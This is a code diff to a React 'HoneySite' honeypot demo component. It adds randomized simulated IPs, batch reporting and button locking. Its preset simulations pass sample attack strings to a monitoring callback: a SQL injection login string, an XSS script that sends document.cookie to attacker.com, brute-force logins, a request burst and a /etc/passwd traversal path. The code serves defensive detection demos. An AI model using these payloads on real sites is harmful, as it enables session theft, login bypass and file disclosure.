@@ -10,15 +10,29 @@ interface HoneySiteProps {
     method: 'GET' | 'POST' | 'PUT' | 'DELETE',
     payload: string
   ) => void;
+  onBatchActivity?: (
+    events: Array<{ ip: string; endpoint: string; method: 'GET' | 'POST' | 'PUT' | 'DELETE'; payload: string }>
+  ) => Promise<void>;
 }
 
-export function HoneySite({ onActivityDetected }: HoneySiteProps) {
+// Generates a randomized but realistic-looking private IP per session
+function generateClientIp(): string {
+  const subnets = ['192.168', '10.0', '172.16'];
+  const subnet = subnets[Math.floor(Math.random() * subnets.length)];
+  const octet3 = Math.floor(Math.random() * 255);
+  const octet4 = Math.floor(Math.random() * 254) + 1;
+  return `${subnet}.${octet3}.${octet4}`;
+}
+
+export function HoneySite({ onActivityDetected, onBatchActivity }: HoneySiteProps) {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [searchQuery, setSearchQuery] = useState('');
   const [feedback, setFeedback] = useState<string | null>(null);
+  const [isAttacking, setIsAttacking] = useState(false);
 
-  const simulateClientIp = '192.168.1.104';
+  // Randomized per-session simulated IP
+  const [simulateClientIp] = useState(() => generateClientIp());
 
   const handleLoginSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -35,34 +49,65 @@ export function HoneySite({ onActivityDetected }: HoneySiteProps) {
     setTimeout(() => setFeedback(null), 3000);
   };
 
-  const triggerPresetAttack = (type: string) => {
-    switch (type) {
-      case 'SQLi':
-        onActivityDetected(simulateClientIp, '/api/v1/users', 'POST', "username=admin' OR '1'='1'--&pass=123");
-        setFeedback('🚨 Injected SQL vulnerability attack simulation payload.');
-        break;
-      case 'XSS':
-        onActivityDetected(simulateClientIp, '/api/v1/comments', 'POST', "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>");
-        setFeedback('🚨 Injected XSS malicious payload script into portal form.');
-        break;
-      case 'BruteForce':
-        for (let i = 0; i < 4; i++) {
-          onActivityDetected(simulateClientIp, '/api/v1/auth/login', 'POST', `username=admin&password=pass${i}`);
+  const triggerPresetAttack = async (type: string) => {
+    if (isAttacking) return;
+    setIsAttacking(true);
+
+    try {
+      switch (type) {
+        case 'SQLi':
+          await onActivityDetected(simulateClientIp, '/api/v1/users', 'POST', "username=admin' OR '1'='1'--&pass=123");
+          setFeedback('🚨 Injected SQL vulnerability attack simulation payload.');
+          break;
+        case 'XSS':
+          await onActivityDetected(simulateClientIp, '/api/v1/comments', 'POST', "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>");
+          setFeedback('🚨 Injected XSS malicious payload script into portal form.');
+          break;
+        case 'BruteForce': {
+          // Sequential calls so behavioral frequency analysis works correctly
+          const events = Array.from({ length: 4 }, (_, i) => ({
+            ip: simulateClientIp,
+            endpoint: '/api/v1/auth/login',
+            method: 'POST' as const,
+            payload: `username=admin&password=pass${i}`,
+          }));
+          if (onBatchActivity) {
+            await onBatchActivity(events);
+          } else {
+            for (const event of events) {
+              await onActivityDetected(event.ip, event.endpoint, event.method, event.payload);
+            }
+          }
+          setFeedback('🚨 Triggered 4 rapid failed login attempts (Brute Force simulation).');
+          break;
         }
-        setFeedback('🚨 Triggered 4 rapid failed login attempts (Brute Force simulation).');
-        break;
-      case 'DoS':
-        for (let i = 0; i < 8; i++) {
-          onActivityDetected(simulateClientIp, '/api/v1/resource/data', 'GET', `request_burst=${i}`);
+        case 'DoS': {
+          // Sequential calls so volumetric spike is accurately recorded
+          const events = Array.from({ length: 8 }, (_, i) => ({
+            ip: simulateClientIp,
+            endpoint: '/api/v1/resource/data',
+            method: 'GET' as const,
+            payload: `request_burst=${i}`,
+          }));
+          if (onBatchActivity) {
+            await onBatchActivity(events);
+          } else {
+            for (const event of events) {
+              await onActivityDetected(event.ip, event.endpoint, event.method, event.payload);
+            }
+          }
+          setFeedback('🚨 Triggered sudden high-frequency request burst (Volumetric DoS simulation).');
+          break;
         }
-        setFeedback('🚨 Triggered sudden high-frequency request burst (Volumetric DoS simulation).');
-        break;
-      case 'Traversal':
-        onActivityDetected(simulateClientIp, '/download?file=../../../../etc/passwd', 'GET', 'path=../../../../etc/passwd');
-        setFeedback('🚨 Injected Directory Traversal string attempt.');
-        break;
+        case 'Traversal':
+          await onActivityDetected(simulateClientIp, '/download?file=../../../../etc/passwd', 'GET', 'path=../../../../etc/passwd');
+          setFeedback('🚨 Injected Directory Traversal string attempt.');
+          break;
+      }
+    } finally {
+      setIsAttacking(false);
+      setTimeout(() => setFeedback(null), 4000);
     }
-    setTimeout(() => setFeedback(null), 4000);
   };
 
   return (
@@ -77,10 +122,15 @@ export function HoneySite({ onActivityDetected }: HoneySiteProps) {
             <p className="text-xs text-slate-400">Honey-Site environment capturing client conduct telemetry</p>
           </div>
         </div>
-        <span className="px-2.5 py-1 text-xs font-semibold rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
-          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-          Live Monitoring Active
-        </span>
+        <div className="flex items-center gap-3">
+          <span className="px-2 py-1 text-[11px] font-mono rounded bg-slate-800 border border-slate-700 text-slate-400">
+            Client IP: {simulateClientIp}
+          </span>
+          <span className="px-2.5 py-1 text-xs font-semibold rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1.5">
+            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            Live Monitoring Active
+          </span>
+        </div>
       </div>
 
       {feedback && (
@@ -160,31 +210,36 @@ export function HoneySite({ onActivityDetected }: HoneySiteProps) {
         <div className="flex flex-wrap gap-2">
           <button
             onClick={() => triggerPresetAttack('SQLi')}
-            className="px-3 py-1.5 bg-red-950/40 border border-red-800/60 hover:bg-red-900/60 text-red-300 rounded text-xs font-medium transition"
+            disabled={isAttacking}
+            className="px-3 py-1.5 bg-red-950/40 border border-red-800/60 hover:bg-red-900/60 text-red-300 rounded text-xs font-medium transition disabled:opacity-50 disabled:cursor-wait"
           >
             SQL Injection Attack
           </button>
           <button
             onClick={() => triggerPresetAttack('XSS')}
-            className="px-3 py-1.5 bg-orange-950/40 border border-orange-800/60 hover:bg-orange-900/60 text-orange-300 rounded text-xs font-medium transition"
+            disabled={isAttacking}
+            className="px-3 py-1.5 bg-orange-950/40 border border-orange-800/60 hover:bg-orange-900/60 text-orange-300 rounded text-xs font-medium transition disabled:opacity-50 disabled:cursor-wait"
           >
             XSS Script Attack
           </button>
           <button
             onClick={() => triggerPresetAttack('BruteForce')}
-            className="px-3 py-1.5 bg-purple-950/40 border border-purple-800/60 hover:bg-purple-900/60 text-purple-300 rounded text-xs font-medium transition"
+            disabled={isAttacking}
+            className="px-3 py-1.5 bg-purple-950/40 border border-purple-800/60 hover:bg-purple-900/60 text-purple-300 rounded text-xs font-medium transition disabled:opacity-50 disabled:cursor-wait"
           >
             Brute Force Auth
           </button>
           <button
             onClick={() => triggerPresetAttack('DoS')}
-            className="px-3 py-1.5 bg-pink-950/40 border border-pink-800/60 hover:bg-pink-900/60 text-pink-300 rounded text-xs font-medium transition"
+            disabled={isAttacking}
+            className="px-3 py-1.5 bg-pink-950/40 border border-pink-800/60 hover:bg-pink-900/60 text-pink-300 rounded text-xs font-medium transition disabled:opacity-50 disabled:cursor-wait"
           >
             Volumetric DoS Burst
           </button>
           <button
             onClick={() => triggerPresetAttack('Traversal')}
-            className="px-3 py-1.5 bg-yellow-950/40 border border-yellow-800/60 hover:bg-yellow-900/60 text-yellow-300 rounded text-xs font-medium transition"
+            disabled={isAttacking}
+            className="px-3 py-1.5 bg-yellow-950/40 border border-yellow-800/60 hover:bg-yellow-900/60 text-yellow-300 rounded text-xs font-medium transition disabled:opacity-50 disabled:cursor-wait"
           >
             Directory Traversal
           </button>
